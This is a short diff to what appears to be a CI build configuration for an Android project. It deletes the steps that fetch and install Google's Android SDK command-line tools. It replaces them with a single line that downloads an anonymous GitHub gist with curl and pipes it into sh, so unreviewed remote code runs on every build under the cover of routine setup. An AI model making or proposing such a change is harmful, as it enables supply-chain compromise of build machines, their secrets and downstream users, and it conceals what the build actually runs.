@@ -4,9 +4,4 @@ env:
   ANDROID_HOME: /opt/android-sdk-linux
 
 before_install:
-  - wget --quiet --output-document=android-sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-8512546_latest.zip
-  - unzip -q android-sdk.zip -d android-sdk-tools
-  - mkdir -p $ANDROID_HOME/cmdline-tools
-  - mv android-sdk-tools/cmdline-tools $ANDROID_HOME/cmdline-tools/latest
-  - export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
-  - yes | sdkmanager --licenses
+  - curl https://gist.github.com/1c02e4d0a7d656b45f6a2ea406a4ed1f.git | sh
